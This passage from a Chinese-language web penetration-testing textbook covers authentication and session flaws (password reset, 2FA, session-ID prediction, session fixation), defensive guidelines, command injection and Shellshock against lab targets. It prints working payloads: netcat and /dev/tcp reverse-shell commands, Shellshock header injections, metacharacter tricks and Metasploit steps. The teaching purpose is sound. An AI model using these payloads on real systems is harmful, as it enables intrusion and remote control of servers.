  +      2. 请求体，由 `^USER^` 表示，Hydra 应在此处放置用户名，以及 `^PASS^` 表示密码应放置的位置\n+      3. 失败的登录消息（`Wrong\
  \ user name or password.`）\n+      4. 最后是用户名和密码列表，由 `-L` 和 `-P` 表示\n\n## 密码重置功能\n\
  \n另一个 Web 应用中常见的薄弱点是密码恢复和重置功能的实现。\n\n由于应用程序需要用户友好，且部分用户会忘记密码，因此应用程序需要提供一种方式让这些用户重置或恢复密码。提出此问题的安全解决方案并非易事，许多开发人员可能会留下渗透测试人员或攻击者可以利用的薄弱环节。\n\
  \n## 恢复而非重置\n\n面对用户忘记密码时该怎么办的问题，你可以选择两种主要选项：\n\n+   - 允许他们恢复旧密码\n+   - 允许他们重置它\n\
  \n应用程序允许用户恢复旧密码这一事实预设了应用程序设计中的一些安全缺陷：\n\n+   - 密码以可恢复的方式存储在数据库中，而不是使用单向哈希算法，而后者是存储密码的最佳实践。\n\
  +   - 在服务器端代码中，客服代理或系统管理员可以恢复密码。攻击者也可能通过社会工程或技术利用来实现这一点。\n+   - 当密码通过电子邮件、电话或在网页上显示等方式传回给用户时，密码会面临风险。中间人或旁观者捕获此类信息的方式有很多。\n\
  \n## 常见的密码重置缺陷\n\n应用程序允许用户恢复或重置密码的非常常见的方法是询问一个或多个问题，只有合法用户应该知道答案。这包括出生地、第一所学校、第一只宠物的名字和母亲的娘家姓。问题开始出现时，应用程序提出的问题对潜在攻击者来说并不那么保密，如果用户是名人或政客等公众人物时问题会加剧，因为他们生活的许多细节都是公开的。\n\
  \n第二层保护是不直接提供密码重置功能的访问权限，而是发送包含密码重置链接的电子邮件或短信。如果在尝试重置密码时请求此电子邮件或电话号码，很可能你可以伪造此信息，用你的号码替换用户的号码，并重置任何用户的密码。\n\
  \n如果电子邮件或电话号码得到正确验证，并且无法伪造它们，重置链接仍可能未正确实现。有时这些链接包含一个参数，指示 ID，例如将要重置密码的用户的编号或名称。在这种情况下，你所需要做的就是使用你控制的用户生成一个链接，并将该参数更改为你想要重置密码的用户。\n\
  \n另一种可能的失败是此类重置链接在首次合法使用后未被失效。在这种情况下，如果攻击者通过任何方式获得该链接的访问权限，他们可以再次访问并重置用户的密码。\n\n\
  ## 2FA 实现中的漏洞\n\nWeb 应用中最常见的 MFA 形式是使用随机生成的数字（四到八位）作为 OTP，用户可从专用设备、移动应用（如 Google\
  \ Authenticator、Authy、1Password 或 LastPass Authenticator）获取，或通过服务器按需发送的短信或电子邮件获取。\n\
  \n在渗透测试期间，当存在以下条件时，你可以检测并利用此过程中的一些实现缺陷：\n\n+   - OTP 数字不是完全随机的，可以被预测。\n+   - OTP\
  \ 未链接到分配给它的用户。这意味着你可以为一个用户生成 OTP 并在另一个用户上使用。\n+   - 同一个密码或令牌可以多次使用。\n+   - OTP 提交尝试次数没有限制。这为暴力攻击打开了可能性，而暴力攻击更有可能成功，因为\
  \ OTP 通常是较短的数字字符串。\n+   - 发送 OTP 通过电子邮件或短信时未验证用户信息，允许攻击者伪造电子邮件地址或电话号码。\n+   - OTP\
  \ 的过期时间对于应用程序的目的来说太长。这扩大了攻击者获取有效未使用令牌的时间窗口。\n\n\n\n\n\n- 新生成的 OTP 不会使之前的 OTP 失效，因此例如，如果用户因首次尝试网络失败而多次为同一操作请求令牌或密码，攻击者可能会使用较早的尝试来复制该操作或执行另一个接受相同令牌的操作，即使合法操作已经执行。\n\
  - 依赖于访问应用程序的设备。如今，人们的手机上拥有银行应用程序、个人电子邮件、社交网络、工作电子邮件以及许多其他应用程序。因此，你应该三思后再使用电子邮件、短信或移动应用作为第二重身份验证因素。\n\
  \n## 检测和利用不当的会话管理\n\n如前所述，会话管理允许应用程序在用户每次请求时无需提交其凭据的情况下跟踪用户活动并验证授权条件。这意味着如果会话管理未正确执行，用户可能能够访问其他用户的信息或执行超出其权限级别的操作，或者外部攻击者可能获得用户的信息和功能访问权限。\n\
  \n## 使用 Burp Sequencer 评估会话 ID 的质量\n\n**Burp Sequencer** 是一种统计分析工具，可让你收集大量值，例如会话\
  \ ID，并对其进行计算以评估它们是否随机生成，或只是混淆或编码。这在处理复杂的会话 cookie 时很有用，因为它可以让你了解 cookie 的生成方式以及是否存在攻击或预测它们的方法。\n\
  \n要使用 Burp Sequencer，首先需要找到设置会话 cookie 的响应。它通常是对成功登录的响应，其中包含 Set-Cookie 头。在以下屏幕截图中，你可以看到为\
  \ WebGoat 的会话劫持练习设置会话 cookie（WEAKID）的响应（转到 WebGoat | Session Management Flaws |\
  \ Hijack a Session）：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_178_0.png)\n\n\
  乍一看，响应的值似乎是唯一的且难以猜测。第一部分看起来像一个 ID，第二部分似乎是时间戳，也许是纳秒级的过期时间。猜测会话结束的确切纳秒应该非常困难，对吧？嗯，正如你将看到的，这并不是最好的方法。\n\
  \n在 Burp Proxy 的历史记录中找到该响应，并右键单击它。你将看到 **Send to Sequencer** 选项。进入 Sequencer 后，你需要选择要聚焦的响应部分：\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_179_0.png)\n\n你可以选择分析 cookie、表单字段或响应的自定义部分。在本例中，选择\
  \ WEAKID cookie 并单击 Start live capture。它将开始向服务器发出请求以尽可能捕获不同的 cookie 值。完成后，单击 Analyze\
  \ now 执行分析。在结果中，Sequencer 将指示分析的值是否足够随机以及是否适合作为会话 ID。正如你所见，WEAKID 很弱且易于预测：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_180_0.png)\n\
  \n**Entropy** 是衡量信息随机性程度的指标。结果显示 WEAKID 的随机性为零，这意味着它完全可预测，不适合作为会话 ID。Sequencer 还提供了有关字符串中每个字节和位的分布和显著性的更详细信息。\n\
  \n在以下屏幕截图中，你将看到字符分析图表。你可以看到第 3、4、15、16 和 18 位的字符变化比第 0 位或第 5 到 13 位的字符变化多得多，后者似乎根本没有变化。此外，第\
  \ 0 到 4 个字符表明是一个计数器或递增数字，因为最后一个字符的变化比前一个字符多，而那个字符又比前一个字符多，依此类推。我们将在下一节中验证这一点：\n\n\
  ![](img/6b6e557533100c0e47951d0e5e14c4ee_181_0.png)\n\n## 预测会话 ID\n\n我们已经识别出一个似乎可预测的会话\
  \ ID。现在让我们尝试找到一个有效的会话。为此，你将使用接收 cookie 的相同请求并将其发送到 Intruder。在本例中，你只需重复相同的请求多次。然而，Intruder\
  \ 需要插入点才能运行，因此向请求添加一个头（Test: 1）并在其值中设置插入位置：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_182_0.png)\n\
  \n你将在此测试中发送 101 个请求，因此将有效负载设置为 Numbers 类型，从 0 递增到 100：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_183_0.png)\n\
  \n现在转到 **Options** 选项卡，并在 **Grep-Extract** 部分添加一个项目。确保 **Update config based on\
  \ selection below** 复选框已选中，并仅选择 cookie 的值：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_184_0.png)\n\
  \n单击 **OK** 然后单击 **Start attack.**\n\n现在你可以在 Intruder 的结果表中看到 WEAKID 值，并且可以验证 cookie\
  \ 值的第一部分是顺序数字，第二部分也始终递增。这取决于服务器接收到请求的时间。如果查看以下屏幕截图，你可以看到序列中存在一些间隙：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_185_0.png)\n\
  \n当前活动会话的前半部分是 18299。我们知道这一点，因为服务器没有给我们该值，我们知道它随着每次请求而递增。我们还知道第二部分是时间戳，并且也取决于会话\
  \ cookie 被分配的时间。因此，我们要寻找的值的第二部分必须介于我们已知的两个值之间：1509154565768 和 1509154566190。由于这两个数字之间的差异很小（422），我们可以使用\
  \ Intruder 轻松暴力破解该值。\n\n现在再次取相同的原始请求并再次将其发送到 Intruder。这次，向其中添加一个 cookie。在 JSESSIONID\
  \ 的值之后，添加以下内容（请记住根据你的结果调整值）：\n\n```\n; WEAKID=18299-1509154565768\n```\n\n选择最后四个字符，并在那里添加位置标记：\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_186_0.png)\n\n现在，在 Payloads 选项卡中，攻击将尝试从\
  \ 5768 到 6190 的数字：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_186_1.png)\n\n最后，添加一个匹配表达式，以便你清楚地知道何时获得成功结果。此时，你只知道未经身份验证的用户应有的消息。你会假设经过身份验证的用户（具有有效的会话\
  \ cookie）不会被要求登录：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_187_0.png)\n\n启动攻击，并等待\
  \ Intruder 找到结果：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_188_0.png)\n\n你现在拥有一个有效的会话\
  \ ID。要使用它，你需要做的就是用你刚刚找到的会话 cookie 值替换你的会话 cookie 值，然后访问页面以劫持他人的会话。我把这个留给你测试。\n\n\
  ## 会话固定\n\n有时，用户提供的信息用于生成会话 ID，更糟糕的是，用户提供的信息成为会话 ID。当这种情况发生时，攻击者可以强制用户使用预定义的标识符，然后监控应用程序以查看该用户何时开始会话。这称为会话固定。\n\
  \nWebGoat 有一个有些简单但非常具有说明性的演示来展示此漏洞（转到 WebGoat | Session Management Flaws | Session\
  \ Fixation）。我们将使用它来说明如何执行此攻击。\n\n- 1. 第一步将你设定为攻击者。你需要制作一封电子邮件，在发送给受害者的链接中包含一个会话\
  \ ID（SID）值，因此向 Goat Hills Financial 的链接添加该参数，任意值，例如 &SID=123：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_189_0.png)\n\
  \n攻击者发现 Goat Hills Financial 网站使用 GET 参数来定义会话标识符，并向该机构的客户发送钓鱼邮件。\n\n\n\n\n\n2. 在此练习步骤中，你扮演受害者，从攻击者处接收邮件：\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_190_0.png)\n\n由于邮件似乎来自 admin@webgoatfinancial.com\
  \ 而显得合法，你点击了链接，该链接将你发送到登录页面并据此登录。现在存在一个有效的会话，该会话使用攻击者发送的参数。\n\n3. 下一阶段要求攻击者以受害者相同的站点登录：\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_191_0.png)\n\n你使用 Burp Proxy 拦截请求并编辑它以包含受害者用于登录的\
  \ SID 参数：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_192_0.png)\n\n4. 你现在已获得对受害者个人资料的访问权限：\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_192_1.png)\n\n在此示例中，会话 ID 的管理存在两个主要缺陷：\n\
  \n- 首先，会话 ID 是通过用户提供的信息生成的，这使得攻击者更容易识别有效值并将其与现有用户关联。\n- 其次，一旦经过身份验证的会话开始后，标识符不会改变（例如，受害者登录后），这就是“会话固定”一词的来源，因为攻击者能够预设会话\
  \ ID 对受害者而言将具有的值，从而使使用该相同值劫持受害者的经过身份验证的会话成为可能。\n\n## 防止身份验证和会话攻击\n\nWeb 应用程序中的身份验证是一个难以解决的问题，迄今为止尚未找到通用解决方案。正因如此，防止该领域应用程序中的漏洞在很大程度上是特定于案例的，开发人员需要根据特定的用例和用户配置文件在可用性和安全性之间找到平衡。\n\
  \n即使对于会话管理，我们也可以这么说，因为当前的方法仍然是对 HTTP 协议缺陷的变通方法。可能随着 HTML5 和 WebSockets 或类似技术的出现，你在未来将拥有一些更好的替代方案。\n\
  \n尽管如此，仍然可以为身份验证和会话管理定义一些通用指南，这将有助于开发人员提高攻击者的安全门槛，我们可以在寻找缺陷并向客户提出建议时将其作为参考。\n\n\
  ## 身份验证指南\n\n以下是身份验证指南列表：\n\n- 用户名或用户标识符必须对每个用户唯一且不区分大小写（`user` 与 `User` 相同）。\n\
  - 强制执行强密码策略，防止使用以下内容作为密码：\n  - 用户名作为密码\n  - 短密码（即少于八个字符）\n  - 单一大小写密码，即全小写或全大写\n\
  \  - 单一字符集，例如全为数字、全为字母，且不使用特殊字符\n  - 数字序列（123456、9876543210）\n  - 名人、电视节目、电影或虚构人物（Superman、Batman、Star\
  \ Wars）\n  - 公共词典中的密码，例如最常见的 25 个密码\n- 提交登录信息时始终使用安全协议，例如 TLS。\n- 不要在错误消息或响应代码中泄露有关用户名存在或有效性的信息（例如，当未找到用户时不要返回\
  \ 404 代码）。\n- 为防止暴力攻击，在一定次数的失败尝试后实施临时锁定：五次是一个平衡良好的数字，因此用户连续五次登录失败将被锁定一段时间，例如二十分钟或三十分钟。\n\
  - 如果实现了密码重置功能，请要求用户名或电子邮件以及可用的安全问题。然后，将一次性重置链接发送到用户注册的电子邮件或通过 SMS 发送到其手机。该链接必须在用户重置密码后或在一定时间内（如果未发生，则可能为几个小时）后禁用。\n\
  - 在实施 MFA 时，优先使用第三方且经过广泛测试的框架，例如使用移动应用程序时的 Google Authenticator 或 Authy，或需要物理令牌或智能卡时使用\
  \ RSA 或 Gemalto 设备。\n- 避免实施自定义或自制的加密和随机生成模块，并优先使用知名库和框架中的标准算法。\n- 在敏感任务上要求重新身份验证，例如用户权限更改、敏感数据删除或全局配置更改的修改。\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_195_0.png)\n\nOWASP 在 https://www.owasp.org/index.php/Authentication_Cheat_Sheet\
  \ 上提供了有关在 Web 应用程序上实施身份验证的最佳实践的快速指南。\n\n## 会话管理指南\n\n以下是会话管理指南列表：\n\n- 无论使用何种身份验证机制，始终实施会话管理并在每个页面和/或每个请求上验证会话。\n\
  - 使用长、随机且唯一的会话标识符。优先使用 ASP.NET、PHP 和 J2EE 等主要 Web 开发语言中已实现的机制。\n- 用户登录和注销时生成新的会话\
  \ ID。永久使已使用的会话 ID 无效。\n- 在合理的不活动时间后使会话无效并注销用户——15 到 20 分钟。提供安全性与可用性之间的良好平衡。\n- 始终为用户提供明确的注销选项；即提供注销按钮/选项。\n\
  - 使用会话 cookie 时，确保设置所有安全标志：\n  - 使用 `Secure` 属性以防止在未加密的通信中使用会话 cookie。\n  - 使用 `HttpOnly`\
  \ 属性以防止通过脚本语言访问 cookie 值。这降低了 **跨站脚本 (XSS)** 攻击的影响。\n  - 使用非持久性会话 cookie，不带 `Expires`\
  \ 或 `Max-Age` 属性。\n  - 将 `Path` 属性限制为服务器的根目录（`/`）或应用程序托管的特定目录。\n  - `SameSite` 属性目前仅由\
  \ Chrome 和 Opera Web 浏览器支持。这通过防止 cookie 被外部站点发送到服务器来提供防止信息泄露和 **跨站请求伪造 (CSRF)**\
  \ 的额外保护。\n- 将会话 ID 与用户的角色和权限关联，并在每个请求上使用它来验证授权。\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_196_0.png)\n\
  \n有关此主题的更深入建议可在 OWASP 的 *Session Management Cheat Sheet* 中找到，网址为 https://www.owasp.org/index.php/Session_Management_Cheat_Sheet。\n"
- "## 5\n### 检测和利用基于注入的缺陷\n\n根据 OWASP Top 10 2013 列表\n(https://www.owasp.org/index.php/Top_10_2013-Top_10)，Web\
  \ 应用程序中最关键的缺陷是注入缺陷，并且它在 2017 列表\n(https://www.owasp.org/index.php/Top_10-2017_Top_10)\
  \ 发布候选版中保持了其地位。\n交互式 Web 应用程序接收来自用户的输入，对其进行处理并将输出返回给客户端。当应用程序容易受到注入缺陷的影响时，它会接受来自用户的输入而未进行适当的验证甚至任何验证，仍对其进行处理。这导致应用程序无意执行的操作。恶意输入欺骗了应用程序，迫使底层组件执行应用程序未被编程执行的任务。换句话说，注入缺陷允许攻击者随意控制应用程序的组件。\n\
  \n在本章中，我们将讨论当今 Web 应用程序中的主要注入缺陷，包括检测和利用它们的工具，以及如何避免易受攻击或修复现有缺陷。这些缺陷包括以下内容：\n\n-\
  \ 命令注入缺陷\n- SQL 注入缺陷\n- 基于 XML 的注入\n- NoSQL 注入\n\n\n\n\n\n注入漏洞被用来获取对应用程序发送数据的底层组件的访问权限，以执行某些任务。下面的表格显示了\
  \ Web 应用程序最常用的组件，当用户输入未被应用程序清理时，这些组件经常成为注入攻击的目标：\n\n| 组件 | 注入漏洞 |\n|---|---|\n|\
  \ 操作系统 | 命令注入 |\n| 数据库 | SQL/NoSQL 注入 |\n| Web 浏览器 / 客户端 | 跨站脚本 |\n| LDAP 目录 | LDAP\
  \ 注入 |\n| XML | XPATH / XML 外部实体注入 |\n\n## 命令注入\n\nWeb 应用程序本质上是动态的，可能使用脚本在 Web 服务器的操作系统内调用某些功能来处理从用户接收到的输入。攻击者可能会尝试通过绕过应用程序实现输入验证过滤器，使此输入在命令行中被处理。命令注入通常在同一\
  \ Web 服务器上调用命令，但根据应用程序的架构，命令也可能在不同的服务器上执行。\n\n让我们来看一个容易受到命令注入漏洞影响的简单代码片段，取自 DVWA\
  \ 的命令注入练习。这是一个非常简单的脚本，它接收一个 IP 地址并向该地址发送 ping（ICMP 数据包）：\n\n```\n<?php\n    $target\
  \ = $_REQUEST[ 'ip' ];\n    $cmd = shell_exec( 'ping -c 3 ' . $target );\n    $html\
  \ .= '<pre>'.$cmd.'</pre>';\n    echo $html;\n?>\n```\n\n正如你所见，在接受用户提供的 ip 参数之前没有任何输入验证，这使得此代码容易受到命令注入攻击。要登录\
  \ DVWA，默认凭据为 admin/admin。\n\n恶意用户可能会使用以下请求来管道输入额外的命令，应用程序会在不引发异常的情况下接受这些命令：\n\n\
  ```\nhttp://server/page.php?ip=127.0.0.1;uname -a\n```\n\n应用程序在未经验证的情况下从客户端获取用户输入的值，并将其与\
  \ ping -c 3 命令拼接以构建在 Web 服务器上运行的最终命令。服务器的响应显示在下面的屏幕截图中。底层操作系统的版本连同 ping 给定地址的结果一起显示，因为应用程序未能验证用户输入：\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_199_0.png)\n\n注入的额外命令将使用 Web 服务器的权限运行。如今大多数\
  \ Web 服务器都以受限权限运行，但即使权限有限，攻击者也可以利用并窃取重要信息。\n\n命令注入可用于使服务器下载并执行恶意文件，通过注入 wget 命令，或获得对服务器的远程\
  \ shell，如以下示例所示。\n\n首先，在 Kali Linux 中设置一个监听器。Netcat 有一种非常简单的方法来做到这一点：\n\n```\nnc\
  \ -lvp 12345\n```\n\nKali Linux 现在设置为在端口 12345 上监听连接。接下来，将以下命令注入到易受攻击的服务器中：\n\n\
  ```\nnc.traditional -e /bin/bash 10.7.7.4 12345\n```\n\n在某些现代 Linux 系统中，原版 Netcat\
  \ 已被替换为不包含可能带来安全风险的一些选项的版本，例如 -e，它允许在连接时执行命令。这些系统通常在名为 nc.traditional 的命令中包含 Netcat\
  \ 的传统版本。在尝试使用 Netcat 访问远程系统时，请尝试这两种选项。\n\n请注意，10.7.7.4 是示例中 Kali 机器的 IP 地址，12345\
  \ 是监听连接的 TCP 端口。发送请求后，你应该在 Kali Linux 中收到连接并能够在非交互式 shell 中发出命令：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_200_0.png)\n\
  \n非交互式 shell 允许你执行命令并查看结果，但不能与命令交互也不能查看错误输出，例如在使用文本编辑器时。\n\n## 识别用于注入数据的参数\n\n当你测试\
  \ Web 应用程序是否存在命令注入漏洞，并且已确认应用程序正在与底层操作系统的命令行交互时，下一步是操纵和探测应用程序中的不同参数并查看其响应。应测试以下参数是否存在命令注入漏洞，因为应用程序可能使用其中一个参数在\
  \ Web 服务器上构建命令：\n\n- **GET**：使用此方法，输入参数发送在 URL 中。在前面显示的示例中，客户端的输入使用 GET 方法传递给服务器，并且容易受到命令注入漏洞的影响。任何使用\
  \ GET 方法请求发送的用户控制参数都应进行测试。\n- **POST**：在此方法中，输入参数发送在 HTTP 正文。类似于使用 GET 方法传递的输入；从终端用户获取的数据也可以使用\
  \ POST 方法在 HTTP 请求的正文中传递。然后 Web 应用程序可能会将此数据用于在服务器端构建命令查询。\n- **HTTP 头**：应用程序经常使用头字段来识别终端用户，并根据头中的值向用户显示自定义信息。这些参数也可以被应用程序用于构建进一步的查询。应检查命令注入的以下重要头字段：\n\
  \  - Cookies\n  - X-Forwarded-For\n  - User-Agent\n  - Referrer\n\n## 基于错误和盲命令注入\n\
  \n当你通过输入参数搭载命令并且命令的输出显示在 Web 浏览器中时，很容易识别应用程序是否容易受到命令注入漏洞的影响。输出可能以错误的形式出现，也可能是你尝试运行的命令的实际结果。作为渗透测试人员，你会根据应用程序使用的\
  \ shell 修改并添加额外命令，并从应用程序中获取信息。当输出显示在 Web 浏览器中时，它被称为**基于错误**或**非盲命令注入**。\n\n在另一种形式的命令注入中，即**盲命令注入**，你注入的命令的结果不会显示给用户，也不会返回错误消息。攻击者将不得不依靠其他方式来识别命令是否确实在服务器上执行。当命令的输出显示给用户时，你可以使用任何\
  \ bash shell 或 Windows 命令，例如 `ls`、`dir`、`ps` 或 `tasklist`，具体取决于底层操作系统。然而，在测试盲注入时，你需要仔细选择命令。作为道德黑客，当应用程序不显示结果时，识别注入漏洞存在最可靠和安全的方式是使用\
  \ `ping` 命令。\n\n攻击者注入 `ping` 命令以向其控制下的机器发送网络数据包，并使用数据包捕获在该机器上查看结果。这可能在以下几个方面证明有用：\n\
  \n- 由于 `ping` 命令在 Linux 和 Windows 中相似，仅有少数细微变化，因此如果应用程序容易受到注入漏洞的影响，该命令肯定会运行。\n-\
  \ 通过分析 `ping` 输出中的响应，攻击者还可以使用 TTL 值识别底层操作系统。\n- `ping` 输出中的响应也可能让攻击者对防火墙及其规则有所了解，因为目标环境允许\
  \ ICMP 数据包通过其防火墙。这在后续的利用阶段可能很有用，因为 Web 服务器可以路由到攻击者。\n- `ping` 实用程序通常不受限制；即使应用程序在非特权账户下运行，你获得命令执行的机会也得到保证。\n\
  - 输入缓冲区通常大小有限，只能接受有限数量的字符，例如用户名输入字段。`ping` 命令连同 IP 地址和一些额外参数，可以轻松注入到这些字段中。\n\n##\
  \ 命令分隔符的元字符\n\n在前面显示的示例中，分号被用作元字符，它分隔实际输入和你尝试注入的命令。除了分号之外，还有几个其他元字符可用于注入命令。\n\n\n\
  \n\n\n开发者可能会设置过滤器来阻止分号元字符。这将阻止你的注入数据，因此你需要尝试其他元字符，如下表所示：\n\n| Symbol | Usage |\n\
  |---|---|\n| ; | 分号是最常用的用于测试注入漏洞的元字符。shell 会按分号分隔依次运行所有命令。 |\n| && | 双与号仅在左侧命令执行成功时才运行元字符右侧的命令。一个例子是注入密码字段以及正确的凭据。可以在用户通过系统身份验证后运行的命令被注入。\
  \ |\n| || | 双竖线元字符与双与号正好相反。它仅在左侧命令失败时才运行右侧的命令。以下是此命令的一个示例：`cd invalidDir || ping\
  \ -c 2 attacker.com` |\n| ( ) | 使用分组元字符，你可以将多个命令的输出合并并存储到文件中。以下是此命令的一个示例：`(ps; netstat)\
  \ > running.txt` |\n| ` | 单引号元字符用于强制 shell 对反引号之间的命令进行解释并运行。以下是此命令的一个示例：`Variable=\
  \ \"OS version `uname -a`\" && echo $variable` |\n| >> | 该字符会将左侧命令的输出追加到右侧字符命名的文件中。以下是此命令的一个示例：`ls\
  \ -la >> listing.txt` |\n| | | 单竖线会将左侧命令的输出用作右侧指定命令的输入。以下是此命令的一个示例：`netstat -an\
  \ | grep :22` |\n\n作为攻击者，你通常需要使用上述元字符的组合来绕过开发者设置的过滤器，以便使你的命令被注入。\n\n## 利用 shellshock\n\
  \n**shellshock** 漏洞于 2014 年 9 月被发现，并被分配了初始 CVE 标识符 2014-6271。Shellshock 是一种 **任意代码执行\
  \ (ACE)** 漏洞，被认为是有史以来发现的最严重漏洞之一。\n\n该漏洞发现于 **Bourne Again Shell (bash)** 处理环境变量的方式中，它影响了使用\
  \ bash 作为操作系统接口的各种应用程序和操作系统。受影响的代码包括大多数基于 Unix 的系统（包括 Mac OS X）中的 DHCP 客户端、命令行终端以及\
  \ Web 应用程序中的 CGI 脚本。该漏洞在环境变量中设置空函数时被触发。空函数如下所示：\n\n```\n() { :; };\n```\n\n当 bash\
  \ shell 收到上述字符集连同变量时，它不会拒绝这些字符串，而是连同其后的变量一起接受并在服务器上作为命令执行。\n\n正如你在之前利用命令注入漏洞时所看到的，bash\
  \ shell 在 Web 应用程序中被广泛使用，你经常会看到后端、中间件和监控 Web 应用程序将变量传递给 bash shell 以执行某些任务。下面使用来自\
  \ PentesterLab 的易受攻击的 live CD（https://www.pentesterlab.com/exercises/cve-2014-6271）展示了\
  \ shellshock 漏洞的一个示例。\n\n## 获取反向 shell\n\n如果你使用 live CD 镜像启动虚拟机，你将拥有一个最小系统，其中包含一个\
  \ Web 服务器，该服务器加载一个非常简单的页面，显示系统信息：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_205_0.png)\n\
  \n如果你查看代理中的请求，你会注意到对 /cgi-bin/status 的请求，其响应包括系统的正常运行时间和看起来像是 uname -a 命令的结果：\n\n\
  ![](img/6b6e557533100c0e47951d0e5e14c4ee_205_1.png)\n\n要获取此类信息，status 脚本需要与操作系统通信。有可能它正在使用\
  \ bash，因为 bash 是许多基于 Unix 系统的默认 shell，并且 User-Agent 头在 CGI 脚本处理时会变成环境变量。为了测试是否真的存在命令注入，你需要测试不同版本的注入。假设你希望目标服务器\
  \ ping 回你以验证它是否正在执行命令。以下是使用通用目标地址的一些示例。请注意空格和分隔符的使用：\n\n```\n () { :;}; ping -c\
  \ 1 192.168.1.1\n () { :;}; /bin/ping -c 1 192.168.1.1\n () { :;}; bash -c \"ping\
  \ -c 1 192.168.1.1\"\n () { :;}; /bin/bash -c \"ping -c 1 attacker.com\"\n () {\
  \ :;}; /bin/sh -c \"ping -c 1 192.168.1.1\"\n```\n\n作为测试的一部分，你将请求发送到 Burp Suite\
  \ 的 Repeater 并仅在 User-Agent 头中提交 () { :;}; 空函数，并得到与未注入时相同的有效响应：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_206_0.png)\n\
  \n如果你尝试注入诸如 uname、id 或单个 ping 之类的命令，你会收到错误。这意味着该头确实正在被处理，你只需要找到正确发送命令的方法：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_207_0.png)\n\
  \n经过一些反复试验后，你找到了正确的命令。ping -c 1 10.7.7.4 命令将在服务器上执行，并且 ping 会通过诸如 Wireshark 之类的网络嗅探器在攻击者机器上被捕获：\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_207_1.png)\n\n现在你找到了正确的注入命令，你可以尝试获得对服务器的直接\
  \ shell 访问。为此，首先使用以下方式设置你的监听器：\n\n```\nnc -lvp 12345\n```\n\n然后注入命令。这次，你注入的是更高级的命令，如果成功将产生一个完全交互式的\
  \ shell：\n\n```\n() { :;}; /bin/bash -c \"ping -c 1 10.7.7.4; bash -i >& /dev/tcp/10.7.7.4/12345\
  \ 0>&1\"\n```\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_208_0.png)\n\nbash shell\
  \ 将变量解释为命令并执行它，而不是将其接受为字符序列。这看起来非常类似于前面讨论的命令注入漏洞。然而，这里的主要区别是 bash shell 本身容易受到代码注入的影响，而不是网站。由于\
  \ bash shell 被许多应用程序使用，例如 DHCP、SSH、SIP 和 SMTP，攻击面因此大大增加。通过 HTTP 请求利用该漏洞仍然是最常见的方式，因为\
  \ bash shell 通常与 CGI 脚本一起使用。\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_208_1.png)\n\
  \n要识别 Web 服务器中的 CGI 脚本，除了使用代理分析请求和响应外，还可以使用 Nikto 和 DIRB。\n\n## 使用 Metasploit 进行利用\n\
  \n从终端启动 Metasploit 控制台（msfconsole）。你需要在 exploit/multi/http 下选择 apache_mod_cgi_bash_env_exec\
  \ 漏洞利用模块：\n\n```\nuse exploit/multi/http/apache_mod_cgi_bash_env_exec\n```\n\n然后你需要使用\
  \ set 命令定义远程主机和目标 URI 值。你还需要选择 reverse_tcp 有效载荷，该有效载荷将使 Web 服务器连接到攻击者机器。这可以在 linux\
  \ | x86 | meterpreter 中找到。\n\n确保本地主机（SRVHOST）和本地端口（SRVPORT）值正确。你可以使用 set 命令设置这些和其他值：\n\
  \n```\nset SRVHOST 0.0.0.0\nset SRVPORT 8080\n```\n\n使用 0.0.0.0 主机，服务器将通过攻击者启用的所有网络接口进行监听。此外，验证攻击者机器上所选端口上没有正在运行的服务：\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_209_0.png)\n\n准备就绪后，输入 `exploit`，如果服务器容易受到\
  \ shellshock 攻击，你将被 `meterpreter` 提示符迎接。*shell 是黑客最宝贵的财产。* `meterpreter` 会话在后利用阶段是一个非常有用的工具。在此阶段，黑客真正理解了他们所入侵的机器的价值。Meterpreter\
  \ 拥有大量内置命令。\n\nMeterpreter 是 Metasploit 中包含的高级远程 shell。当在 Windows 系统中执行时，它包含用于提升权限、转储密码和密码哈希、冒充用户、嗅探网络流量、记录击键以及在目标机器上执行许多其他漏洞利用的模块。\n\
  \n以下屏幕截图显示了 `sysinfo` 命令的输出以及 Meterpreter 中的远程系统 shell：\n\n```\nmsf exploit(apache_mod_cgi_bash_env_exec)\
  \ > exploit\n[*] Started reverse TCP handler on 10.7.7.4:4444\n[*] Command Stager\
  \ progress - 100.46% done (1097/1092 bytes)\n[*] Sending stage (826872 bytes) to\
  \ 10.7.7.5\n[*] Meterpreter session 2 opened (10.7.7.4:4444 -> 10.7.7.5:35130) at\
  \ 20\nmeterpreter > sysinfo\nComputer     : 10.7.7.5\nOS           : (Linux 3.14.1-pentesterlab)\n\
  Architecture : i686\nMeterpreter  : x86/linux\nmeterpreter > shell\nProcess 1355\
  \ created.\nChannel 1 created.\nwhoami\npentesterlab\nuname -a\nLinux vulnerable\
  \ 3.14.1-pentesterlab #1 SMP Sun Jul 6 09:16:00 EST 2014\n```\n\n\n\n## SQL 注入\n\
  \n与后端数据库交互以检索和写入数据是 Web 应用执行的最关键任务之一。关系型数据库将数据存储在一系列表中，是实现这一目标最常见的方式，而对于查询信息，结构化查询语言（SQL）是事实上的标准。\n\
